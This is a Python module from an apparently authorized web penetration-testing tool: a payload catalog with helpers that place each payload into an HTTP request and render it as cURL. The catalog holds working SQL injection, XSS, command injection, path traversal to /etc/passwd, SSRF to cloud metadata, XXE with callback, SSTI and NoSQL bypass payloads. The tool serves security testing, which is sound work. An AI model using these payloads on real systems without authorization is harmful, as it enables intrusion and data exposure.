"""Shared payload catalog and request-composition helpers.

The GUI uses this module as the single source of truth for the Payload
Workbench and Intruder.  Everything here is intentionally Qt-free so request
placement, filtering, and previews remain easy to test.
"""

from __future__ import annotations

import base64
import hashlib
import html
import json
from dataclasses import dataclass
from typing import Dict, Iterable, List, Mapping, Optional, Sequence, Tuple
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit


AUTHORIZED_USE_NOTICE = (
    "Use only on systems you own or have explicit permission to test."
)


@dataclass(frozen=True)
class PayloadCategory:
    """Navigation and guidance metadata for one payload category."""

    key: str
    name: str
    description: str
    workflow_hint: str
    default_location: str
    locations: Tuple[str, ...]
    cwe: str


@dataclass(frozen=True)
class PayloadTemplate:
    """A selectable payload with enough context to use it intentionally."""

    key: str
    category: str
    family: str
    name: str
    payload: str
    description: str
    expected_signal: str
    locations: Tuple[str, ...]
    tags: Tuple[str, ...] = ()
    platform: str = "Any"
    impact: str = "Low"
    source: str = "Built in"


@dataclass(frozen=True)
class PayloadRequest:
    """Exact request produced by placing one payload at one insertion point."""

    method: str
    url: str
    headers: Mapping[str, str]
    body: Optional[str]
    insertion_point: str
    raw_payload: str
    rendered_payload: str

    def preview(self) -> str:
        """Render a compact, exact HTTP-style request preview."""
        parts = urlsplit(self.url)
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query
        lines = [f"{self.method} {path} HTTP/1.1", f"Host: {parts.netloc}"]
        seen = {"host"}
        for name, value in self.headers.items():
            if name.lower() in seen:
                continue
            seen.add(name.lower())
            lines.append(f"{name}: {value}")
        if self.body is not None and "content-length" not in seen:
            lines.append(f"Content-Length: {len(self.body.encode('utf-8'))}")
        lines.append("")
        if self.body is not None:
            lines.append(self.body)
        return "\n".join(lines)

    def as_repeater_prefill(self) -> Dict[str, object]:
        """Return the shape consumed by the existing Repeater page."""
        return {
            "method": self.method,
            "url": self.url,
            "headers": dict(self.headers),
            "data": self.body or "",
        }


LOCATION_OPTIONS: Tuple[Tuple[str, str], ...] = (
    ("query", "Query parameter"),
    ("path", "URL path / FUZZ marker"),
    ("form", "Form field"),
    ("json", "JSON property"),
    ("header", "Request header"),
    ("cookie", "Cookie value"),
    ("raw_body", "Raw request body"),
)

ENCODING_OPTIONS: Tuple[Tuple[str, str], ...] = (
    ("none", "Automatic for location"),
    ("url", "URL encoded"),
    ("double_url", "Double URL encoded"),
    ("base64", "Base64"),
    ("hex", "Hex"),
    ("html", "HTML entities"),
    ("unicode", "Unicode escapes"),
)


PAYLOAD_CATEGORIES: Tuple[PayloadCategory, ...] = (
    PayloadCategory(
        "sqli",
        "SQL injection",
        "Query-shape probes grouped by technique and database family.",
        "Start with syntax and paired true/false probes. Use UNION or time "
        "families only when the response behavior supports that path.",
        "query",
        ("query", "form", "json", "cookie", "header"),
        "CWE-89",
    ),
    PayloadCategory(
        "xss",
        "Cross-site scripting",
        "Context-specific reflection probes for HTML, attributes, scripts, and URLs.",
        "Match the payload family to the output context and verify execution in "
        "an isolated browser profile.",
        "query",
        ("query", "form", "json", "path", "header"),
        "CWE-79",
    ),
    PayloadCategory(
        "command",
        "Command injection",
        "Non-destructive command and timing probes for Unix and Windows shells.",
        "Use identity or short delay commands. Avoid file changes, callbacks, "
        "or disruptive commands unless the rules explicitly allow them.",
        "query",
        ("query", "form", "json", "header", "raw_body"),
        "CWE-78",
    ),
    PayloadCategory(
        "traversal",
        "Path traversal / LFI",
        "Linux and Windows file-read probes with common encoding variants.",
        "Choose a harmless, predictable file and compare against a baseline. "
        "Do not request secrets or application credentials.",
        "query",
        ("query", "path", "form", "json"),
        "CWE-22",
    ),
    PayloadCategory(
        "ssrf",
        "Server-side request forgery",
        "Loopback, alternate-IP, metadata-root, and callback placeholders.",
        "Prefer a controlled callback domain. Treat cloud metadata probes as "
        "moderate impact and stop before retrieving credentials.",
        "query",
        ("query", "form", "json", "header", "raw_body"),
        "CWE-918",
    ),
    PayloadCategory(
        "xxe",
        "XML external entity",
        "Inline file-read, XInclude, and controlled out-of-band XML probes.",
        "Send as an XML body and use a harmless local file or a callback domain "
        "you control. Avoid resource-exhaustion entity payloads.",
        "raw_body",
        ("raw_body", "form"),
        "CWE-611",
    ),
    PayloadCategory(
        "ssti",
        "Server-side template injection",
        "Engine-specific arithmetic and string-evaluation fingerprints.",
        "Start with math/string probes that only identify evaluation. Escalate "
        "to code execution manually and only when engagement rules allow it.",
        "query",
        ("query", "form", "json", "raw_body"),
        "CWE-1336",
    ),
    PayloadCategory(
        "nosql",
        "NoSQL injection",
        "Mongo-style operator bodies and syntax probes for JSON-backed endpoints.",
        "Use raw JSON bodies for operator payloads and compare authenticated and "
        "unauthenticated baselines without enumerating user data.",
        "raw_body",
        ("raw_body", "json", "query", "form"),
        "CWE-943",
    ),
    PayloadCategory(
        "custom",
        "Custom",
        "Locally saved or imported payloads.",
        "Document the expected signal and intended insertion point before use.",
        "query",
        tuple(key for key, _label in LOCATION_OPTIONS),
        "—",
    ),
)

CATEGORY_BY_KEY: Dict[str, PayloadCategory] = {
    category.key: category for category in PAYLOAD_CATEGORIES
}


def _template(
    key: str,
    category: str,
    family: str,
    name: str,
    payload: str,
    description: str,
    expected_signal: str,
    *,
    locations: Optional[Tuple[str, ...]] = None,
    tags: Tuple[str, ...] = (),
    platform: str = "Any",
    impact: str = "Low",
) -> PayloadTemplate:
    category_info = CATEGORY_BY_KEY[category]
    return PayloadTemplate(
        key=key,
        category=category,
        family=family,
        name=name,
        payload=payload,
        description=description,
        expected_signal=expected_signal,
        locations=locations or category_info.locations,
        tags=tags,
        platform=platform,
        impact=impact,
    )


BUILTIN_PAYLOADS: Tuple[PayloadTemplate, ...] = (
    # SQL injection: explicit families make the old "SQLi" grab-bag navigable.
    _template(
        "sqli-syntax-single",
        "sqli",
        "Syntax probes",
        "Single-quote probe",
        "'",
        "Tests whether a string delimiter changes parsing.",
        "A database error or a stable response delta versus the clean baseline.",
        tags=("starter", "string"),
    ),
    _template(
        "sqli-syntax-double",
        "sqli",
        "Syntax probes",
        "Double-quote probe",
        '"',
        "Tests double-quoted or identifier-style parsing.",
        "A database error or repeatable response delta.",
        tags=("starter", "string"),
    ),
    _template(
        "sqli-boolean-true-numeric",
        "sqli",
        "Boolean / basic 1=1",
        "Numeric true condition",
        "1 OR 1=1",
        "A basic true condition for numeric query contexts.",
        "Response matches the true path and differs from the paired false condition.",
        tags=("starter", "true-control"),
    ),
    _template(
        "sqli-boolean-false-numeric",
        "sqli",
        "Boolean / basic 1=1",
        "Numeric false control",
        "1 AND 1=2",
        "Paired false control for the numeric true condition.",
        "Response differs consistently from the true condition.",
        tags=("starter", "false-control"),
    ),
    _template(
        "sqli-boolean-true-string",
        "sqli",
        "Boolean / basic 1=1",
        "Quoted true condition",
        "' OR '1'='1'-- -",
        "A comment-terminated true condition for string contexts.",
        "A repeatable true/false response delta.",
        tags=("starter", "true-control", "string"),
    ),
    _template(
        "sqli-auth-comment",
        "sqli",
        "Authentication bypass",
        "Username comment truncation",
        "admin'-- -",
        "Tests whether a quoted username can truncate the remaining predicate.",
        "Authentication behavior changes without a valid password.",
        tags=("auth", "comment"),
        impact="Moderate",
    ),
    _template(
        "sqli-order-three",
        "sqli",
        "UNION preparation",
        "ORDER BY column probe",
        "' ORDER BY 3-- -",
        "Checks whether at least three selected columns are accepted.",
        "A column-count boundary inferred from paired ORDER BY probes.",
        tags=("union", "column-count"),
        impact="Moderate",
    ),
    _template(
        "sqli-union-one",
        "sqli",
        "UNION SELECT",
        "One-column NULL UNION",
        "' UNION SELECT NULL-- -",
        "Type-neutral one-column UNION shape.",
        "The UNION branch is accepted without a column-count/type error.",
        tags=("union", "one-column"),
        impact="Moderate",
    ),
    _template(
        "sqli-union-two",
        "sqli",
        "UNION SELECT",
        "Two-column NULL UNION",
        "' UNION SELECT NULL,NULL-- -",
        "Type-neutral two-column UNION shape.",
        "The UNION branch is accepted without a column-count/type error.",
        tags=("union", "two-column"),
        impact="Moderate",
    ),
    _template(
        "sqli-union-mysql-version",
        "sqli",
        "UNION SELECT",
        "MySQL version marker",
        "' UNION SELECT NULL,@@version-- -",
        "Two-column UNION that exposes the database version in a visible column.",
        "A MySQL/MariaDB version string appears in the response.",
        tags=("union", "version"),
        platform="MySQL / MariaDB",
        impact="Moderate",
    ),
    _template(
        "sqli-union-postgres-version",
        "sqli",
        "UNION SELECT",
        "PostgreSQL version marker",
        "' UNION SELECT NULL,version()-- -",
        "Two-column PostgreSQL UNION version probe.",
        "A PostgreSQL version string appears in the response.",
        tags=("union", "version"),
        platform="PostgreSQL",
        impact="Moderate",
    ),
    _template(
        "sqli-error-mysql",
        "sqli",
        "Error based",
        "MySQL extractvalue error",
        "' AND extractvalue(1,concat(0x7e,version()))-- -",
        "Forces a MySQL XML error containing a harmless version marker.",
        "An XPATH error includes a database version fragment.",
        tags=("error", "version"),
        platform="MySQL / MariaDB",
        impact="Moderate",
    ),
    _template(
        "sqli-time-mysql",
        "sqli",
        "Time based",
        "MySQL five-second delay",
        "' AND SLEEP(5)-- -",
        "Introduces a bounded delay for blind timing comparison.",
        "Repeated requests are roughly five seconds slower than the baseline.",
        tags=("blind", "delay"),
        platform="MySQL / MariaDB",
        impact="Moderate",
    ),
    _template(
        "sqli-time-postgres",
        "sqli",
        "Time based",
        "PostgreSQL five-second delay",
        "'; SELECT pg_sleep(5)-- -",
        "Introduces a bounded PostgreSQL delay.",
        "Repeated requests are roughly five seconds slower than the baseline.",
        tags=("blind", "delay", "stacked"),
        platform="PostgreSQL",
        impact="Moderate",
    ),
    _template(
        "sqli-time-mssql",
        "sqli",
        "Time based",
        "SQL Server five-second delay",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "Introduces a bounded SQL Server delay.",
        "Repeated requests are roughly five seconds slower than the baseline.",
        tags=("blind", "delay", "stacked"),
        platform="Microsoft SQL Server",
        impact="Moderate",
    ),
    # XSS families are organized by output context.
    _template(
        "xss-html-svg",
        "xss",
        "HTML body context",
        "SVG onload",
        "<svg/onload=alert(document.domain)>",
        "Compact executable marker for an HTML element context.",
        "JavaScript executes only in the isolated verification browser.",
        tags=("reflected", "html"),
    ),
    _template(
        "xss-html-img",
        "xss",
        "HTML body context",
        "Image error handler",
        "<img src=x onerror=alert(document.domain)>",
        "Event-handler marker that does not need a closing script tag.",
        "The onerror handler executes in the rendered page.",
        tags=("reflected", "html", "event"),
    ),
    _template(
        "xss-attribute-breakout",
        "xss",
        "HTML attribute context",
        "Quoted attribute breakout",
        '" autofocus onfocus=alert(document.domain) x="',
        "Breaks a double-quoted attribute and adds a focus event.",
        "The injected attribute survives parsing and the focus event executes.",
        tags=("attribute", "event"),
    ),
    _template(
        "xss-script-string",
        "xss",
        "JavaScript string context",
        "Single-quoted script breakout",
        "';alert(document.domain);//",
        "Closes a JavaScript string and comments the trailing syntax.",
        "The script remains syntactically valid and the marker executes.",
        tags=("javascript", "string"),
    ),
    _template(
        "xss-url-javascript",
        "xss",
        "URL context",
        "JavaScript URL",
        "javascript:alert(document.domain)",
        "Tests URL sinks that accept executable schemes.",
        "The scheme is preserved and executes only after an allowed interaction.",
        tags=("url", "dom"),
        impact="Moderate",
    ),
    # Command injection uses harmless identity or bounded delay commands.
    _template(
        "cmd-unix-semicolon",
        "command",
        "Unix separators",
        "Semicolon identity probe",
        "; id",
        "Runs a non-destructive identity command after the original command.",
        "A uid/gid marker appears in the response.",
        tags=("unix", "output"),
        platform="Unix-like",
        impact="Moderate",
    ),
    _template(
        "cmd-unix-pipe",
        "command",
        "Unix separators",
        "Pipe identity probe",
        "| id",
        "Tests a pipe separator with a non-destructive identity command.",
        "A uid/gid marker appears or response behavior changes consistently.",
        tags=("unix", "output"),
        platform="Unix-like",
        impact="Moderate",
    ),
    _template(
        "cmd-unix-subshell",
        "command",
        "Unix substitution",
        "Command substitution",
        "$(id)",
        "Tests shell command substitution without changing server state.",
        "A uid/gid marker is substituted into output.",
        tags=("unix", "substitution"),
        platform="Unix-like",
        impact="Moderate",
    ),
    _template(
        "cmd-unix-delay",
        "command",
        "Timing",
        "Unix five-second delay",
        "; sleep 5",
        "Bounded blind command-injection timing probe.",
        "Repeated requests are roughly five seconds slower than the baseline.",
        tags=("unix", "blind", "delay"),
        platform="Unix-like",
        impact="Moderate",
    ),
    _template(
        "cmd-windows-whoami",
        "command",
        "Windows separators",
        "Ampersand identity probe",
        "& whoami",
        "Runs a non-destructive identity command through cmd.exe.",
        "A domain or local account name appears in the response.",
        tags=("windows", "output"),
        platform="Windows",
        impact="Moderate",
    ),
    # Traversal targets predictable non-secret operating-system files.
    _template(
        "traversal-linux-basic",
        "traversal",
        "Linux",
        "Basic passwd path",
        "../../../../etc/passwd",
        "Classic relative traversal to a predictable system account file.",
        "The response contains a root account line such as root:x:0:0.",
        tags=("linux", "relative"),
        platform="Unix-like",
    ),
    _template(
        "traversal-linux-nested",
        "traversal",
        "Encoding variants",
        "Nested separator bypass",
        "....//....//....//etc/passwd",
        "Tests normalizers that collapse doubled separators before traversal.",
        "The response contains the expected system-file marker.",
        tags=("linux", "normalization"),
        platform="Unix-like",
    ),
    _template(
        "traversal-linux-double-url",
        "traversal",
        "Encoding variants",
        "Double-encoded traversal",
        "..%252f..%252f..%252fetc%252fpasswd",
        "Tests applications that decode a path more than once.",
        "The response contains the expected system-file marker after decoding.",
        tags=("linux", "double-encoding"),
        platform="Unix-like",
    ),
    _template(
        "traversal-windows-basic",
        "traversal",
        "Windows",
        "Windows win.ini",
        "..\\..\\..\\Windows\\win.ini",
        "Uses a predictable, non-secret Windows configuration file.",
        "The response contains a [fonts] or [extensions] section.",
        tags=("windows", "relative"),
        platform="Windows",
    ),
    # SSRF stops at reachability and includes a replaceable callback token.
    _template(
        "ssrf-loopback-name",
        "ssrf",
        "Loopback",
        "Localhost HTTP",
        "http://localhost/",
        "Tests name-based loopback filtering.",
        "A response or timing delta indicates a server-side request.",
        tags=("loopback", "http"),
    ),
    _template(
        "ssrf-loopback-ip",
        "ssrf",
        "Loopback",
        "IPv4 loopback",
        "http://127.0.0.1/",
        "Tests direct IPv4 loopback filtering.",
        "A response or timing delta indicates a server-side request.",
        tags=("loopback", "ipv4"),
    ),
    _template(
        "ssrf-loopback-decimal",
        "ssrf",
        "IP representations",
        "Decimal loopback",
        "http://2130706433/",
        "Tests alternate IPv4 number parsing.",
        "Behavior matches a loopback request despite the alternate notation.",
        tags=("loopback", "normalization"),
    ),
    _template(
        "ssrf-callback",
        "ssrf",
        "Out-of-band",
        "Controlled callback placeholder",
        "https://{{callback-host}}/blackthorn-ssrf",
        "Replace the token with a callback host you control.",
        "A correlated DNS or HTTP callback is observed.",
        tags=("oob", "recommended"),
    ),
    _template(
        "ssrf-metadata-root",
        "ssrf",
        "Cloud metadata",
        "AWS metadata root only",
        "http://169.254.169.254/latest/meta-data/",
        "Checks metadata reachability without selecting a credential path.",
        "A metadata directory listing or distinct response is returned.",
        tags=("cloud", "aws", "stop-before-credentials"),
        impact="Moderate",
    ),
    # XXE bodies are kept complete so the request preview is unambiguous.
    _template(
        "xxe-file-hostname",
        "xxe",
        "Inline entity",
        "Local hostname marker",
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
        "<root>&xxe;</root>",
        "Reads a small, non-secret hostname file through an external entity.",
        "The parsed response contains the host name.",
        locations=("raw_body",),
        tags=("file", "inline"),
        platform="Unix-like",
        impact="Moderate",
    ),
    _template(
        "xxe-oob",
        "xxe",
        "Out-of-band",
        "Controlled external entity callback",
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM '
        '"https://{{callback-host}}/blackthorn-xxe">]>\n'
        "<root>&xxe;</root>",
        "Replace the token with a callback host you control.",
        "A correlated callback is observed.",
        locations=("raw_body",),
        tags=("oob", "recommended"),
        impact="Moderate",
    ),
    _template(
        "xxe-xinclude",
        "xxe",
        "XInclude",
        "XInclude hostname marker",
        '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/hostname"/></root>',
        "Tests XInclude processing without a document type declaration.",
        "The parsed response contains the host name.",
        locations=("raw_body",),
        tags=("xinclude", "file"),
        platform="Unix-like",
        impact="Moderate",
    ),
    # SSTI catalog deliberately fingerprints evaluation without RCE payloads.
    _template(
        "ssti-jinja-math",
        "ssti",
        "Jinja2 / Twig",
        "Double-brace arithmetic",
        "{{7*7}}",
        "Common evaluation fingerprint for Jinja2 and Twig-like engines.",
        "The rendered response contains 49 rather than the literal payload.",
        tags=("math", "starter"),
    ),
    _template(
        "ssti-jinja-string",
        "ssti",
        "Jinja2",
        "String multiplication",
        "{{7*'7'}}",
        "Differentiates Python/Jinja evaluation from numeric-only rendering.",
        "The response contains 7777777.",
        tags=("string", "fingerprint"),
        platform="Jinja2",
    ),
    _template(
        "ssti-freemarker",
        "ssti",
        "FreeMarker / EL",
        "Dollar-brace arithmetic",
        "${7*7}",
        "Evaluation fingerprint for FreeMarker and expression-language contexts.",
        "The rendered response contains 49.",
        tags=("math", "starter"),
    ),
    _template(
        "ssti-erb",
        "ssti",
        "ERB",
        "ERB arithmetic",
        "<%= 7*7 %>",
        "Ruby ERB evaluation fingerprint.",
        "The rendered response contains 49.",
        tags=("math", "erb"),
        platform="Ruby / ERB",
    ),
    # NoSQL operator examples are complete bodies and should use raw-body mode.
    _template(
        "nosql-ne-null",
        "nosql",
        "MongoDB operators",
        "$ne authentication probe",
        '{"username":{"$ne":null},"password":{"$ne":null}}',
        "Tests whether raw MongoDB operators reach an authentication query.",
        "Authentication behavior differs from a scalar-string baseline.",
        locations=("raw_body",),
        tags=("mongodb", "auth", "json"),
        platform="MongoDB-style",
        impact="Moderate",
    ),
    _template(
        "nosql-regex",
        "nosql",
        "MongoDB operators",
        "$regex match probe",
        '{"username":{"$regex":"^admin"},"password":{"$ne":null}}',
        "Tests operator parsing with a bounded username prefix.",
        "Behavior differs from an impossible regex baseline.",
        locations=("raw_body",),
        tags=("mongodb", "regex", "json"),
        platform="MongoDB-style",
        impact="Moderate",
    ),
    _template(
        "nosql-query-syntax",
        "nosql",
        "Syntax probes",
        "Operator-shaped parameter",
        '{"$ne":null}',
        "Minimal operator object for APIs that accept a JSON-valued property.",
        "A validation, query, or authorization response changes consistently.",
        locations=("json", "raw_body"),
        tags=("operator", "starter"),
        platform="MongoDB-style",
    ),
)


def category_name(category_key: str) -> str:
    """Return a display name while tolerating unknown custom categories."""
    category = CATEGORY_BY_KEY.get(str(category_key or "").lower())
    return category.name if category else str(category_key or "Custom")


_CATEGORY_ALIASES = {
    "sql injection": "sqli",
    "sqli": "sqli",
    "xss": "xss",
    "cross-site scripting": "xss",
    "command injection": "command",
    "os command injection": "command",
    "path traversal": "traversal",
    "lfi": "traversal",
    "ssrf": "ssrf",
    "xxe": "xxe",
    "ssti": "ssti",
    "template injection": "ssti",
    "nosql": "nosql",
    "nosql injection": "nosql",
    "custom": "custom",
}


def normalize_category(value: str) -> str:
    """Map database/display category values to stable catalog keys."""
    clean = str(value or "custom").strip().lower()
    return _CATEGORY_ALIASES.get(clean, clean if clean in CATEGORY_BY_KEY else "custom")


def custom_payload_templates(rows: Optional[Iterable[Mapping[str, object]]]) -> List[PayloadTemplate]:
    """Adapt database custom-payload rows to normal catalog templates."""
    templates: List[PayloadTemplate] = []
    for row in rows or ():
        payload = str(row.get("payload") or "")
        name = str(row.get("name") or "Custom payload")
        row_id = row.get("id")
        digest = hashlib.sha1(
            f"{row_id}:{name}:{payload}".encode("utf-8", "replace")
        ).hexdigest()[:12]
        category = normalize_category(str(row.get("category") or "custom"))
        category_info = CATEGORY_BY_KEY[category]
        templates.append(
            PayloadTemplate(
                key=f"custom-{digest}",
                category=category,
                family="My payloads",
                name=name,
                payload=payload,
                description=str(row.get("description") or "Locally saved payload."),
                expected_signal="Define and verify the expected response change manually.",
                locations=category_info.locations,
                tags=("custom",),
                platform="Any",
                impact=str(row.get("severity") or "MEDIUM").title(),
                source="Custom",
            )
        )
    return templates


def payload_catalog(
    custom_rows: Optional[Iterable[Mapping[str, object]]] = None,
) -> List[PayloadTemplate]:
    """Return built-ins plus optional database-backed custom entries."""
    return list(BUILTIN_PAYLOADS) + custom_payload_templates(custom_rows)


def filter_payloads(
    payloads: Sequence[PayloadTemplate],
    *,
    query: str = "",
    category: str = "",
    family: str = "",
) -> List[PayloadTemplate]:
    """Filter catalog entries for the workbench without changing source order."""
    needle = str(query or "").strip().lower()
    wanted_category = normalize_category(category) if category else ""
    wanted_family = str(family or "").strip().lower()
    matches: List[PayloadTemplate] = []
    for item in payloads:
        if wanted_category and item.category != wanted_category:
            continue
        if wanted_family and item.family.lower() != wanted_family:
            continue
        if needle:
            haystack = " ".join(
                (
                    item.name,
                    item.family,
                    item.payload,
                    item.description,
                    item.platform,
                    " ".join(item.tags),
                    category_name(item.category),
                )
            ).lower()
            if needle not in haystack:
                continue
        matches.append(item)
    return matches


def families_for(
    payloads: Sequence[PayloadTemplate], category: str = ""
) -> List[str]:
    """Return ordered unique family labels for a category or the full catalog."""
    wanted_category = normalize_category(category) if category else ""
    families: List[str] = []
    for item in payloads:
        if wanted_category and item.category != wanted_category:
            continue
        if item.family not in families:
            families.append(item.family)
    return families


def payloads_for_family(
    category: str,
    family: str,
    custom_rows: Optional[Iterable[Mapping[str, object]]] = None,
) -> List[PayloadTemplate]:
    """Return one exact category/family selection for Intruder handoff."""
    return filter_payloads(
        payload_catalog(custom_rows),
        category=category,
        family=family,
    )


def encode_payload(payload: str, encoding: str = "none") -> str:
    """Apply an explicit payload transformation before request placement."""
    value = str(payload)
    encoding = str(encoding or "none")
    if encoding == "none":
        return value
    if encoding == "url":
        return quote(value, safe="")
    if encoding == "double_url":
        return quote(quote(value, safe=""), safe="")
    if encoding == "base64":
        return base64.b64encode(value.encode("utf-8")).decode("ascii")
    if encoding == "hex":
        return value.encode("utf-8").hex()
    if encoding == "html":
        return html.escape(value, quote=True)
    if encoding == "unicode":
        return "".join(f"\\u{ord(char):04x}" for char in value)
    raise ValueError(f"Unknown payload encoding: {encoding}")


def _normalized_url(url: str) -> str:
    value = str(url or "").strip()
    if value and "://" not in value:
        value = "https://" + value
    parts = urlsplit(value)
    if parts.scheme.lower() not in {"http", "https"} or not parts.netloc:
        raise ValueError("Enter an absolute HTTP or HTTPS target URL.")
    return urlunsplit(
        (parts.scheme.lower(), parts.netloc, parts.path or "/", parts.query, parts.fragment)
    )


def _validate_field_name(name: str, label: str) -> str:
    value = str(name or "").strip()
    if not value:
        raise ValueError(f"Enter a {label}.")
    if any(char in value for char in "\r\n:"):
        raise ValueError(f"The {label} contains an invalid control character.")
    return value


def _urlencode_pairs(
    pairs: Sequence[Tuple[str, str]], *, preserve_percent: bool = False
) -> str:
    return urlencode(
        list(pairs),
        doseq=True,
        safe="%" if preserve_percent else "",
        quote_via=quote,
    )


def build_payload_request(
    *,
    method: str,
    url: str,
    payload: str,
    location: str,
    name: str = "q",
    encoding: str = "none",
    headers: Optional[Mapping[str, str]] = None,
    base_body: str = "",
) -> PayloadRequest:
    """Place a payload into an exact request and describe the insertion point.

    ``name`` means parameter/property/header/cookie name depending on
    ``location``. Existing query parameters, form fields, JSON properties, and
    headers are preserved where possible.
    """
    normalized_url = _normalized_url(url)
    request_method = str(method or "GET").strip().upper()
    if not request_method or any(char.isspace() for char in request_method):
        raise ValueError("Enter a valid HTTP method.")
    location = str(location or "query")
    if location not in dict(LOCATION_OPTIONS):
        raise ValueError(f"Unknown insertion location: {location}")
    rendered = encode_payload(str(payload), encoding)
    request_headers = {
        str(key).strip(): str(value)
        for key, value in dict(headers or {}).items()
        if str(key).strip()
    }
    body: Optional[str] = str(base_body) if base_body else None
    parts = urlsplit(normalized_url)
    insertion_point = ""
    preserve_percent = encoding in {"url", "double_url"}

    if location == "query":
        field_name = _validate_field_name(name, "query parameter name")
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        pairs = [(key, value) for key, value in pairs if key != field_name]
        pairs.append((field_name, rendered))
        query = _urlencode_pairs(pairs, preserve_percent=preserve_percent)
        normalized_url = urlunsplit(
            (parts.scheme, parts.netloc, parts.path or "/", query, parts.fragment)
        )
        insertion_point = f"Query parameter: {field_name}"
    elif location == "path":
        path_value = quote(rendered, safe="%" if preserve_percent else "")
        path = parts.path or "/"
        if "FUZZ" in path:
            path = path.replace("FUZZ", path_value)
        else:
            path = path.rstrip("/") + "/" + path_value
        normalized_url = urlunsplit(
            (parts.scheme, parts.netloc, path, parts.query, parts.fragment)
        )
        insertion_point = "URL path"
    elif location == "form":
        field_name = _validate_field_name(name, "form field name")
        pairs = parse_qsl(str(base_body or ""), keep_blank_values=True)
        pairs = [(key, value) for key, value in pairs if key != field_name]
        pairs.append((field_name, rendered))
        body = _urlencode_pairs(pairs, preserve_percent=preserve_percent)
        request_headers.setdefault(
            "Content-Type", "application/x-www-form-urlencoded"
        )
        insertion_point = f"Form field: {field_name}"
    elif location == "json":
        field_name = _validate_field_name(name, "JSON property name")
        document: Dict[str, object] = {}
        if str(base_body or "").strip():
            try:
                loaded = json.loads(str(base_body))
            except json.JSONDecodeError as exc:
                raise ValueError(f"Base body is not valid JSON: {exc.msg}.") from exc
            if not isinstance(loaded, dict):
                raise ValueError("The base JSON body must be an object.")
            document.update(loaded)
        document[field_name] = rendered
        body = json.dumps(document, separators=(",", ":"), ensure_ascii=False)
        request_headers.setdefault("Content-Type", "application/json")
        insertion_point = f"JSON property: {field_name}"
    elif location == "header":
        field_name = _validate_field_name(name, "header name")
        if any(char in rendered for char in "\r\n"):
            raise ValueError("Header values cannot contain newline characters.")
        request_headers[field_name] = rendered
        insertion_point = f"Request header: {field_name}"
    elif location == "cookie":
        field_name = _validate_field_name(name, "cookie name")
        if any(char in rendered for char in "\r\n;"):
            raise ValueError("Cookie values cannot contain newlines or semicolons.")
        existing_cookie = next(
            (
                value
                for key, value in request_headers.items()
                if key.lower() == "cookie"
            ),
            "",
        )
        cookie_parts = [
            part.strip()
            for part in existing_cookie.split(";")
            if part.strip() and not part.strip().startswith(field_name + "=")
        ]
        cookie_parts.append(f"{field_name}={rendered}")
        for key in list(request_headers):
            if key.lower() == "cookie":
                del request_headers[key]
        request_headers["Cookie"] = "; ".join(cookie_parts)
        insertion_point = f"Cookie value: {field_name}"
    else:
        body = rendered
        request_headers.setdefault("Content-Type", "text/plain")
        insertion_point = "Raw request body"

    return PayloadRequest(
        method=request_method,
        url=normalized_url,
        headers=request_headers,
        body=body,
        insertion_point=insertion_point,
        raw_payload=str(payload),
        rendered_payload=rendered,
    )


def payload_request_to_curl(request: PayloadRequest) -> str:
    """Render a copyable cURL command for an exact composed request."""

    def shell_quote(value: object) -> str:
        return "'" + str(value).replace("'", "'\\''") + "'"

    parts = ["curl", "-i", "-X", request.method, shell_quote(request.url)]
    for name, value in request.headers.items():
        parts.extend(("-H", shell_quote(f"{name}: {value}")))
    if request.body is not None:
        parts.extend(("--data-raw", shell_quote(request.body)))
    return " ".join(parts)


def intruder_payload_sets(
    custom_rows: Optional[Iterable[Mapping[str, object]]] = None,
) -> Dict[str, List[str]]:
    """Return catalog-backed, category-level sets for the existing Intruder UI."""
    sets: Dict[str, List[str]] = {}
    for item in payload_catalog(custom_rows):
        label = category_name(item.category)
        sets.setdefault(label, [])
        if item.payload not in sets[label]:
            sets[label].append(item.payload)
    return sets
